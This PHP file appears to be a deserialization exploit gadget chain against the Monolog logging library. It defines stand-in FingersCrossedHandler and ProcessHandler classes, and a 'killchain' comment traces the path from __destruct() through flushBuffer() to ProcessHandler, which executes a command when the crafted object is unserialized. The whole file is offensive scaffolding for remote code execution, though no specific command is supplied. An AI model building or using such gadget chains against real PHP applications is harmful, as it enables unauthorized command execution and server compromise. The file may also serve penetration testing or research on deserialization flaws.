<?php

namespace Monolog\Handler 
{
    // killchain :  
    // <abstract>__destruct() => <FingersCrossedHandler>close() => <FingersCrossedHandler>flushBuffer() => <ProcessHandler>handleBatch($records)
    
    class FingersCrossedHandler {
      protected $passthruLevel;
      protected $buffer = array();
      protected $handler;
    
     public function __construct($handler)
     {
         $this->handler = $handler;
         $this->passthruLevel = 0;
         $this->buffer = [
                [
                    "message" => "x",
                    "context" => [],
                    "level" => 500,
                    "level_name" => "CRITICAL",
                    "channel" => "app",
                    "datetime" => new \DateTimeImmutable("2024-01-01 00:00:00.000000", new \DateTimeZone("UTC")),
                    "extra" => []
                ]
            ];
     }
    
    }

    class ProcessHandler
    {
        private $command;
        private $process = null;
        private $pipes = [];
        private $cwd = null;
        protected $level = 100;
        protected $bubble = true;
        protected $formatter = null;
        protected $processors = [];
        

        function __construct($command)
        {
            $this->command = $command;
        }
    }

}
